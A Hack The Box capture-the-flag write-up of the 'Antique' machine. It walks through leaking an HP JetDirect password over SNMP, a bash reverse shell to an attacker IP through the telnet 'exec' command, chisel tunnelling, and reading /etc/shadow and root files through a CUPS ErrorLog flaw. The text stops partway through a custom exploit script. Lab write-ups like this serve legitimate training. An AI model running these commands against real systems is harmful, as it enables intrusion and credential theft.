---
Primary_category: "[[EASY]]"
title: ANTIQUE
draft: false
banner: https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
banner_y: 0.88286
tags:
  - HTB
  - HTBEasy
  - SNMP
  - OffensivePython
  - Pwncat-cs
  - ImproperAccessControl
  - Tunneling
  - PortForwarding
  - CUPS
  - InformationLeakage
  - UDP
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### Summary

- ***UDP Port Scanning using Nmap***
- ***Information Disclosure via SNMP***
- ***Retrieving the value of an SNMP OID using Python Scripting***
- ***Connection from the Remote Machine Telnet Session via a Rev Shell using Pwncat-cs***
- ***Inspection of System Process and Systemd Services***
- ***Reverse Port Forwarding using Chisel to access a Remote Machine's Local Port***
- ***Local Privilege Escalation through a CUPS CVE***
- ***Leveraging Improper Access Control via Python Scripting***

![[ANTIQUE-20250217155916945.webp|400]]

---

#### Setup

Directory creation with the Machine's Name

```bash
mkdir Antique && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***

```bash
mkt
```

> [!IMPORTANT]- *Tree*
>
> ```bash
> .
> ├── evidence
> │   ├── creds
> │   ├── data
> │   └── screenshots
> ├── logs
> ├── scans
> ├── scope
> └── tools
> ```
>

---

#### Recon

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 10.129.62.5
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.62.5 (10.129.62.5) 56(84) bytes of data.
> 64 bytes from 10.129.62.5: icmp_seq=1 ttl=63 time=36.9 ms
> 
> --- 10.129.62.5 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 36.852/36.852/36.852/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Linux Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn --disable-arp-ping -oG allPorts TARGET
```

> [!BUG]- *AllPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Mon Feb 17 16:03:37 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.62.5
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.62.5 ()	Status: Up
> Host: 10.129.62.5 ()	Ports: 23/open/tcp//telnet///	Ignored State: closed (65534)
> # Nmap done at Mon Feb 17 16:03:48 2025 -- 1 IP address (1 host up) scanned in 11.10 seconds
> ```
>

**Open TCP Ports → 23**

Since there is only one port opened in the *TCP Range*, let's run another *Nmap Scan*, but, this time, to check what *UDP* Ports are opened in the machine

```bash
nmap --top-ports 50 --open -sU -T5 -vvv -n -Pn --disable-arp-ping -oG allPortsUDP 10.129.62.5 |& grep -iP -- '\sopen\s'
Discovered open port 161/udp on 10.129.62.5
```

> [!NOTE]- *Command Output*
>
> ```bash
> Discovered open port 161/udp on 10.129.62.5
> 161/udp   open          snmp           udp-response ttl 63
> ```
>

**Open UDP Ports → 161**

###### *Comprehensive Scan*

The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***

```bash
extractPorts allPorts
```

> [!BUG]- *ExtractPorts*
>
> ```bash
> [+] Extracting information...
> 
>    [+] IP Address: 10.129.62.5
>    [+] Open Ports: 23
>
> [+] Ports Copied to Clipboard
> ```
>

Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***

Note that this scan is also exported to have evidence at hand

```bash
nmap -p23 -sCV -n -Pn --disable-arp-ping -oN targetedTCP 10.129.62.5
```

> [!BUG]- *TargetedTCP*
>
> ```bash
> # Nmap 7.94SVN scan initiated Mon Feb 17 16:16:39 2025 as: nmap -p23 -sCV -n -Pn --disable-arp-ping -oN targetedTCP 10.129.62.5
> Nmap scan report for 10.129.62.5
> Host is up (0.037s latency).
> 
> PORT   STATE SERVICE VERSION
> 23/tcp open  telnet?
> | fingerprint-strings: 
> |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
> |     JetDirect
> |     Password:
> |   NULL: 
> |_    JetDirect
> 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
> SF-Port23-TCP:V=7.94SVN%I=7%D=2/17%Time=67B352DD%P=x86_64-pc-linux-gnu%r(N
> SF:ULL,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\n
> SF:Password:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Get
> SF:Request,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP
> SF:\x20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\
> SF:nPassword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(
> SF:DNSVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStat
> SF:usRequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x
> SF:20JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\
> SF:nPassword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPasswo
> SF:rd:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Ke
> SF:rberos,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x
> SF:20JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPass
> SF:word:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20"
> SF:)%r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,
> SF:19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetD
> SF:irect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword
> SF::\x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Termina
> SF:lServer,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetD
> SF:irect\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\
> SF:x20")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,1
> SF:9,"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDir
> SF:ect\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x2
> SF:0")%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20J
> SF:etDirect\n\nPassword:\x20");
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Mon Feb 17 16:19:25 2025 -- 1 IP address (1 host up) scanned in 166.63 seconds
> ```
>

The same process is carried out for the *TCP Port* opened. Since it is only one port, as the *TCP* scan, just proceed as follows

```bash
nmap -p161 -sU -sV --script "*snmp* and safe" -n -Pn --disable-arp-ping -oN targetedUDP 10.129.62.5
```

> [!BUG]- *TargetedUDP*
>
> ```bash
> Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 16:18 CET
> Nmap scan report for 10.129.62.5
> Host is up (0.036s latency).
> 
> PORT    STATE SERVICE VERSION
> 161/udp open  snmp    SNMPv1 server (public)
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
> ```
>

##### *23 - Telnet*

We can start with the *TCP* port, related to the telnet service in this case

There is not much we can do except connect to this port using the `telnet` client and see what happens

```bash
telnet 10.129.62.5
```

> [!NOTE]- *Command Output*
>
> ```bash
> Trying 10.129.62.5...
> Connected to 10.129.62.5.
> Escape character is '^]'.
> 
> HP JetDirect
> 
> Password: 
> ```
>

After establishing the connection, a password is requested to log in successfully

As we do not have any valid credentials yet, we cannot access this service

We could think about bruteforce to access this service, but it seems to has a high response time, so it is not feasible

Note that there is a banner or text above the requested password → ***HP JetDirect***

This text may refers to something related to the *system*, *service* or *software* running behind this *telnet port*

Therefore, it is not a bad idea to search for *CVEs* or any *security flaws* related to this software

Before start with the *Google Search*, let's check it out using the `searchsploit` tool from ***[ExploitDB](https://www.exploit-db.com/)***

```bash
searchsploit HP JetDirect
```

> [!NOTES]- *Command Output*
>
> ```bash
> HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)                                                                                                                                                   | unix/remote/45273.rb
> HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)                                                                                                                                                   | unix/remote/45273.rb
> HP JetDirect FTP Print Server - 'RERT' Denial of Service                                                                                                                                                              | windows/dos/29787.py
> HP JetDirect J3111A - Invalid FTP Command Denial of Service                                                                                                                                                           | hardware/dos/20090.txt
> HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit)                                                                                                                                               | hardware/remote/17635.rb
> HP JetDirect PJL - Query Execution (Metasploit)                                                                                                                                                                       | hardware/remote/17636.rb
> HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure                                                                                                                                                       | hardware/remote/22319.txt
> HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification                                                                                                                                         | hardware/remote/20565.c
> Shellcodes: No Results
> ```
>

There are several results, but the one that, applied to this case, stands out from the rest, is the following →

```text
HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure 
```

There is a *Password Disclosure* for a *JetAdmin* device via *SNMP*

Since there is a *SNMP* service running on this machine, let's see what we get out of it

##### *161 - SNMP*

From the *Comprehensive Scan* performed with *Nmap* before, we were able to extract the *SNMP Version* and *Community String* used to authenticate and perform *SNMP queries*

- ***SNMP Version → 1***

- ***SNMP Community String → Public***

Therefore, we can carry out a *SNMP* query using `snmpwalk` as follows →

```bash
snmpwalk -v 1 -c public 10.129.62.5
```

> [!NOTE]- *Command Output*
>
> ```bash
> SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
> ```
>

Nothing interesting here, let's examine the above security flaw found using `searchsploit`

---

#### Exploitation

##### *Information Disclosure through a SNMP Query*

> ***[Reference](https://github.com/4l3xBB/Exploits/tree/main/CVE-2002-1048)***

This security flaw in the *HP JetDirect Printers* was reported as ***[[CVE-2002-1048]]***

If we examine with `searchsploit` the previous reference found →

```bash
searchsploit --examine hardware/remote/22319.txt | cat --language java -
```

> [!BUG]- *22319.txt*
>
> ```bash
>    Exploit: HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure
>        URL: https://www.exploit-db.com/exploits/22319
>       Path: /usr/share/exploitdb/exploits/hardware/remote/22319.txt
>      Codes: CVE-2002-1048, OSVDB-2079
>   Verified: True
>  File Type: ASCII text, with very long lines (323)
>  HP JetDirect J2552A/J2552B/J2591A/J3110A/J3111A/J3113A/J3263A/300.0 X Printer SNMP JetAdmin Device Password Disclosure Vulnerability
>  
>  source: https://www.securityfocus.com/bid/7001/info
>  
>  A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer.
>  
>  It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requeste
>  r. This could allow a remote user to access and change configuration of the printer.
>  
>  C:\>snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0
> ```
>

This means that an attacker could obtain the *Web JetAdmin Device Password* by sending a *SNMP Get* request to the agent installed in the vulnerable printer

Then, the *SNMP* agent replies with the *hex-encoded password* of the device

The *OID* requested must be the following one → `.1.3.6.1.4.1.11.2.3.9.1.1.13.0`

So, let's use `snmpwalk` again but requesting the value of the above *OID*

```bash
snmpwalk -v 1 -c public 10.129.62.5 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 2> /dev/null
```

> [!NOTE]- *Command Output*
>
> ```bash
> JETDIRECT3-MIB::gdPasswords.0 = Wrong Type (should be OCTET STRING): BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
>33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
> ```
> 

Given the previous output and knowing that the value of the above *OID* is *hex-encoded*, proceed as follows →

```bash
while IFS= read -r _OIDValue ; do xxd -r <<< "${_OIDValue##*:}" ; done < <( snmpwalk -v 1 -c public 10.129.62.5 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 2> /dev/null ) | string -n 6
```

> [!NOTE]- *Command Output*
>
> ```bash
> P@ssw0rd@123!!123
> ```
>

And we obtain the *plain text password*

> [!BUG]- *Custom Exploit*
>
> A custom exploit which automates the entire process is found [[#*CVE-2002-1048*|here]]
>

Let's try to authenticate to the *telnet service* using the above *password*

```bash
telnet 10.129.62.5
```

> [!NOTE]- *Command Output*
>
> ```bash
> Trying 10.129.62.5...
> Connected to 10.129.62.5.
> Escape character is '^]'.
>
> HP JetDirect
>
> Password: P@ssw0rd@123!!123
>
> Please type "?" for HELP
>
> ```
>

And we logged in successfully!

As it says, we can type `?` for *HELP*

```bash
> ?
```

> [!NOTE]- *Command Output*
>
> ```bash
> 
> To Change/Configure Parameters Enter:
> Parameter-name: value Carriage Return
> 
> Parameter-name Type of value
> ip: IP-address in dotted notation
> subnet-mask: address in dotted notation (enter 0 for default)
> default-gw: address in dotted notation (enter 0 for default)
> syslog-svr: address in dotted notation (enter 0 for default)
> idle-timeout: seconds in integers
> set-cmnty-name: alpha-numeric string (32 chars max)
> host-name: alpha-numeric string (upper case only, 32 chars max)
> dhcp-config: 0 to disable, 1 to enable
> allow: ip [mask] (0 to clear, list to display, 10 max)
> 
> addrawport: TCP port num (TCP port num 3000-9000)
> deleterawport: TCP port num
> listrawport: (No parameter required)
> 
> exec: execute system commands (exec id)
> exit: quit from telnet session
> ```
>

The `exec` command catches my attention since it allows us to execute system commands

Therefore, we can establish a *reverse shell* and gain access to the *remote system* as the user running this *telnet service*


---
#### Shell as Telnet User

Before proceed with it, note that, in this case, the usual approach to upgrade the obtained *shell* to a ***[Fully Interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)*** using `script` or `python3` with the *pty module* does not work correctly

Therefore, we can use ***[pwncat-cs](https://github.com/calebstewart/pwncat)*** to achieve this task

##### *Pwncat-cs*

> ***[Reference](https://pwncat.readthedocs.io/en/latest/)***

###### *From the attacker* ⚔️

- ***Setup***

```bash
python3 -m venv venv
source !$/bin/activate
pip install pwncat-cs
```

- ***Setup a Listening Port***

```bash
python3 venv/bin/pwncat-cs --listen --port 443 2> /dev/null
```

###### *From the target* 🎯

- ***Stablish the Reverse Connection***

```bash
exec bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"
```

> [!NOTE]- *Command Output*
>
> ```bash
> [18:29:33] Welcome to pwncat 🐈!
> [18:33:32] received connection from 10.129.62.5:55600
> [18:33:34] 10.129.62.5:55600: registered new host w/ db
> ```
>

- ***TTY/PTY Treatment***

```bash
(local) pwncat$ back
(remote) lp@antique:/var/spool/lpd$
```

```bash
export TERM=xterm-256color
export SHELL=/bin/bash
. /etc/skel/.bashrc
stty rows 61 columns 248
```

And we now have a *fully interactive TTY* 😊

Just go the *home directory* of the current user called *lp* and get the *user.txt* flag

```bash
cat ~/user.txt
```

---

#### Privesc

***Initial Non-Privileged User → lp***

##### *Information Disclosure due to Improper Access Control - CUPS*

Once we have access to the machine as the user running the *telnet service (lp)*, let's check if there is any security flaw that we can leverage to pivote to *root* or any other user with more privileges that the current one

###### *Sudo*

We cannot check if the user is allowed to run a certain *binary* or *script* as a specific user as we do not have his password

```bash
sudo -l
```

> [!NOTE]- *Command Output*
>
> ```bash
> [sudo] password for lp: 
> ```
>

###### *User Groups*

Let's check which groups the user belongs to

```bash
id
```

> [!NOTE]- *Command Output*
>
> ```bash
> uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> ```
>

We are part of the *lpadmin* group

A quick *Google* search shows that this group is related to *printing services* such as *CUPS*

> ***[Reference](https://www.linux.org/threads/linux-cups.37576/)***

Therefore, we could check if *CUPS* is installed in the *target system*

We check if this system was booted by *systemd*

```bash
cat /proc/1/comm
```

> [!NOTE]- *Command Output*
>
> ```bash
> systemd
> ```
>

And it was

So, let's see the *units of service* launched by *systemd*

```bash
systemctl list-units --type=service --state=running --all --no-pager --no-legend
```

> [!NOTE]- *Command Output*
>
> ```bash
> accounts-daemon.service   loaded active running Accounts Service                                            
> atd.service               loaded active running Deferred execution scheduler                                
> cron.service              loaded active running Regular background program processing daemon                
> dbus.service              loaded active running D-Bus System Message Bus                                    
> getty@tty1.service        loaded active running Getty on tty1                                               
> irqbalance.service        loaded active running irqbalance daemon                                           
> multipathd.service        loaded active running Device-Mapper Multipath Device Controller                   
> open-vm-tools.service     loaded active running Service for virtual machines hosted on VMware               
> polkit.service            loaded active running Authorization Manager                                       
> rsyslog.service           loaded active running System Logging Service                                      
> systemd-journald.service  loaded active running Journal Service                                             
> systemd-logind.service    loaded active running Login Service                                               
> systemd-timesyncd.service loaded active running Network Time Synchronization                                
> systemd-udevd.service     loaded active running udev Kernel Device Manager                                  
> udisks2.service           loaded active running Disk Manager                                                
> upower.service            loaded active running Daemon for power management                                 
> vgauth.service            loaded active running Authentication service for virtual machines hosted on VMware
> ```
>

*CUPS* does not appear there

We could check for the process existence of *CUPS-related* processes

```bash
pgrep --full --list-full cups
```

> [!NOTE]- *Command Output*
>
> ```bash
> 1158 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
> ```
>

And a *CUPS* process is running in the system

We can see that this process is being executed as *root*

```bash
ps -p$( pgrep --full cups ) -o user,pid,ppid,pgid,tty,sid,command
```

> [!NOTE]- *Command Output*
>
> ```bash
> USER         PID    PPID    PGID TT           SID COMMAND
> root        1158       1    1158 ?           1158 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
> ```
>

Strangely, the *parent process* is *initd*

```bash
ps -p $( ps -p$( pgrep --full cups ) -o ppid= ) -o user,pid,ppid,pgid,tty,sid,command
```

> [!NOTE]- *Command Output*
>
> ```bash
> USER         PID    PPID    PGID TT           SID COMMAND
> root           1       0       1 ?              1 /sbin/init maybe-ubiquity
> ```
>

That's why it did not appear when we list all the services launched by *systemd*

As expected, we cannot list the *sockets* or *ports* opened by this process using *lsof*

```bash
lsof -p$( pgrep --full cups ) -a -i 4TCP -s TCP:listen -Pn
```

> [!NOTE]- *Command Output*
>
> ```bash
> (readlink: Permission denied)
> ```
>

We list before all the command that launched the *CUPS process* using `pgrep`

```bash
1158 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
```

We can check the configuration file to see if there is any directive related to *Listening Ports* or *Unix Sockets*

```bash
head /etc/cups/cupsd.conf
```

> [!NOTE]- *Command Output*
>
> ```bash
> LogLevel warn
> SystemGroup lpadmin
> Listen localhost:631
> Listen /var/run/cups/cups.sock
> Browsing On
> BrowseOrder allow,deny
> BrowseAllow all
> BrowseLocalProtocols
> DefaultAuthType Basic
> WebInterface Yes
> ```
>

And yes, there is. The service is listening on the *localhost* on *port 631*

Let's check the *Open TCP Ports* in the system and their associated processes

```bash
ss -lntp
```

> [!NOTES]- *Command Output*
>
> ```bash
> State                     Recv-Q                    Send-Q                                        Local Address:Port                                         Peer Address:Port                    Process                                               
> LISTEN                    0                         4096                                              127.0.0.1:631                                               0.0.0.0:*                                                                             
> LISTEN                    0                         128                                                 0.0.0.0:23                                                0.0.0.0:*                        users:(("python3",pid=1159,fd=3))                    
> LISTEN                    0                         4096                                                  [::1]:631                                                  [::]:*                                               
> ```
>

It does not show us the process related to *port 631*, but we know that it is *CUPS*

Another *Google* search shows that *CUPS* can be configured and monitored using a web interface, which by default is available at *http://localhost:631/admin*

Just use any *HTTP Client* such as `curl` to get the headers of the *HTTP Response*

```bash
curl --silent --request GET --location --head "http://localhost:631/admin"
```

> [!NOTE]- *Command Output*
> 
> ```bash
> HTTP/1.1 200 OK
> Date: Mon, 17 Feb 2025 18:30:07 GMT
> Server: CUPS/1.6
> Connection: Keep-Alive
> Keep-Alive: timeout=30
> Content-Language: en_US
> Transfer-Encoding: chunked
> Set-Cookie: org.cups.sid=f7364d4c7f443d823958e646b943abf5; path=/;
> Content-Type: text/html;charset=utf-8
> ```
> 

According to the *Server HTTP Header*, this *Web Application* running on *port 631* is related to *CUPS*

The *CUPS Version* is *1.6*

Before looking for any *CVEs* or *security flaws* related to that *CUPS Version*, if we want to access that *port 631*, listening locally, from our host, we can perform a *reverse port forwarding*, from the *target* to our machine

As the *SSH* service is not running, we cannot use it to set up *local port forwarding* via *Pub key Authentication* or *Dynamic port forwarding* using a *socks5  proxy*

So, just use `chisel` to carry out this task

###### *Reverse Port Forwarding via Chisel*

> ***[Chisel](https://github.com/jpillora/chisel)***

- ***From the Attacker*** ⚔️

First, download `chisel` and get it ready to transfer it to the *target*

```bash
curl --silent --request GET --location "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz" --output chisel.gz
```

```bash
gunzip !$
chmod 700 "${_%.*}"
```

Set up a *Simple HTTP Server* using *python3* 

```bash
python3 -m http.server 8888
```

In parallel to the *HTTP Server*, set up the *Chisel Server* as follows →

```bash
./chisel server --reverse --port 1234
```

> [!NOTE]- *Command Output*
>
> ```bash
> ./chisel server --reverse --port 1234
> 2025/02/17 19:55:04 server: Reverse tunnelling enabled
> 2025/02/17 19:55:04 server: Fingerprint F4eiTJ1AEqHker6FnMJdr1N0SwQBEpDvDvZgJ2M+RXk=
> 2025/02/17 19:55:04 server: Listening on http://0.0.0.0:1234
> ```
>

- ***From the Target*** 🎯

Request the `chisel` binary using a *HTTP Client* such as `wget` or `curl`

```bash
wget "http://10.10.16.24:8888/chisel" -O chisel
chmod 700 !$
```

Then, run it as a *client* to connect to the *Chisel Server* running on our machine

```bash
./chisel client 10.10.16.24:1234 R:631:127.0.0.1:631
```

> [!NOTE]- *Command Output*
>
> ```bash
> 2025/02/17 18:55:57 client: Connecting to ws://10.10.16.24:1234
> 2025/02/17 18:55:58 client: Connected (Latency 39.529095ms)
> ```
>

With this, a *tunnel* has been created from *Port 631* on the target to *Port 631* of our machine

Therefore, we can access *port 631* on the target machine through our *localhost* on *port 631*

```bash title="Attacker"
curl --silent --request GET --location --head "http://localhost:631"
```

> [!NOTE]- *Command Output*
>
> ```bash
> HTTP/1.1 200 OK
> Date: Mon, 17 Feb 2025 19:04:28 GMT
> Server: CUPS/1.6
> Connection: Keep-Alive
> Keep-Alive: timeout=30
> Content-Language: en_US
> Content-Type: text/html; charset=utf-8
> Last-Modified: Thu, 13 May 2021 05:36:41 GMT
> Content-Length: 3792
> ```
>

Likewise, we can do the same from the browser

```bash title="Firefox"
http://localhost:631
```

![[ANTIQUE-20250217200623505.webp|500]]

###### *Searching for the CVE*

As we already did, first use `searchsploit` to filter by the *version* of *CUPS* running on the *target (1.6.1)*

```bash
searchsploit CUPS 1.6.1
```

Nothing interesting

If we do the following search in *Google*, we find the ***[CVE-2012-5519](https://nvd.nist.gov/vuln/detail/CVE-2012-5519)***, which allows a local user in the *lpadmin* group to read or write arbitrary files as root by leveraing the web interface

Since the user *lp* belongs to the *lpadmin* group, we can search for a *PoC* or *exploit* for this *CVE*

And we find this ***[Github Repository](https://github.com/p1ckzi/CVE-2012-5519)***

There is a *PoC* →

```bash
cupsctl ErrorLog=/etc/shadow WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
```

It seems that by leveraring the *cupsct* binary, as a user belonging to the *lpadmin* group, we can modify certain directives in the *cupsd.conf* configuration file to set a *System Sensitive File* as the value for the *ErrorLog* parameter

```bash
cupsctl ErrorLog=/etc/shadow WebInterface=Yes
```

Then, request the content of the file pointed by the *ErrorLog* directive as follows →

```bash
curl 'http://localhost:631/admin/log/error_log'
```

Therefore, we can proceed as follows to get the content of the following sensitive files →

> [!IMPORTANT]- *Important*
>
> Note that we have seen that the *CUPS* process is running as *Root*, which means that we can get the content of any file on the system
>

###### /root/.ssh/id_rsa

```bash
cupsctl ErrorLog=/root/.ssh/id_rsa WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
```

We get an *HTTP 404 Error*, which means that the resource does not exist in the system

###### /etc/shadow

```bash
cupsctl ErrorLog=/etc/shadow WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
```

> [!BUG]- */etc/shadow*
>
> ```bash
> root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
> daemon:*:18375:0:99999:7:::
> bin:*:18375:0:99999:7:::
> sys:*:18375:0:99999:7:::
> sync:*:18375:0:99999:7:::
> games:*:18375:0:99999:7:::
> man:*:18375:0:99999:7:::
> lp:*:18375:0:99999:7:::
> mail:*:18375:0:99999:7:::
> news:*:18375:0:99999:7:::
> uucp:*:18375:0:99999:7:::
> proxy:*:18375:0:99999:7:::
> www-data:*:18375:0:99999:7:::
> backup:*:18375:0:99999:7:::
> list:*:18375:0:99999:7:::
> irc:*:18375:0:99999:7:::
> gnats:*:18375:0:99999:7:::
> nobody:*:18375:0:99999:7:::
> systemd-network:*:18375:0:99999:7:::
> systemd-resolve:*:18375:0:99999:7:::
> systemd-timesync:*:18375:0:99999:7:::
> messagebus:*:18375:0:99999:7:::
> syslog:*:18375:0:99999:7:::
> _apt:*:18375:0:99999:7:::
> tss:*:18375:0:99999:7:::
> uuidd:*:18375:0:99999:7:::
> tcpdump:*:18375:0:99999:7:::
> landscape:*:18375:0:99999:7:::
> pollinate:*:18375:0:99999:7:::
> systemd-coredump:!!:18389::::::
> lxd:!:18389::::::
> usbmux:*:18891:0:99999:7:::
> ```
>

Extract the *Root's hash* and try to crack them using `hashcat`

```bash
nvim hash
```

> [!BUG]- *hash*
>
> ```bash
> $6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.
> ```
>

It is not necessary to specify the *hash-type* as *hashcat* detects it automatically

```bash
hashcat -O hash /usr/share/wordlists/rockyou.txt
```

However, I can tell you in advance that the *password* is not in the above dictionary 😊

###### /root/.bash_history

```bash
cupsctl ErrorLog=/root/.bash_history WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
```

We do not get any output, if we check the *HTTP Status Code* of the response →

```bash
curl --silent --request GET --output /dev/null --write-out '%{http_code}\n' 'http://localhost:631/admin/log/error_log'
```

> [!NOTE]- *Command Output*
>
> ```bash
> 200
> ```
>

It is a *200*, so the file exists but may point to the `/dev/null` file

As far as i know, there is no way to get an *interactive shell* as *Root* **by exploiting this *CVE***

> [!BUG]- *Custom Exploit*
>
> A custom exploit which automates the entire process is found [[#*CVE-2012-5519*|here]]
>

Therefore, simply grab the content of the *root.txt* flag as follows

```bash
cupsctl ErrorLog=/root/root.txt WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
```

Report it on *HTB* and move on to the next! 😊

---

#### Custom Exploits

##### *CVE-2002-1048*

> ***[Reference](https://github.com/4l3xBB/Exploits/tree/main/CVE-2002-1048)***

> [!IMPORTANT]- *CVE-2002-1048*
>
> ```python
> #!/usr/bin/env python3
> 
> import argparse
> import asyncio
> import sys
> import time
> from puresnmp import Client, V2C, PyWrapper
> from colorama import Fore, Style
> from pwn import *
> 
> def banner() -> str:
> 
>     return f"""{Fore.GREEN}
>   ______   ______    ___  ___  ___  ___    ______  ____ ___ 
>  / ___/ | / / __/___|_  |/ _ \/ _ \|_  |__<  / _ \/ / /( _ )
> / /__ | |/ / _//___/ __// // / // / __/___/ / // /_  _/ _  |
> \___/ |___/___/   /____/\___/\___/____/  /_/\___/ /_/ \___/ 
> 
>            {Style.RESET_ALL}"""
> 
> async def getOID(host: str, comm_string: str, oid: str) -> str:
> 
>     """
>     This function creates a Client Object related to the SNMP Agent which is wrapped using the PyWrapper class
> 
>     > Note that PyWrapp takes a Class an argument and converts its sync methods to async
> 
>     A GET SNMP Request is then made by calling the get method of the Client Object
> 
>     It returns the value associated with the requested OID
>     """
> 
>     try:
>         client = PyWrapper(Client(host, V2C(comm_string)))
>         response = await client.get(oid)
> 
>         return response.decode()
> 
>     except Exception as e:
> 
>         raise RuntimeError(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
> 
> async def main() -> None:
> 
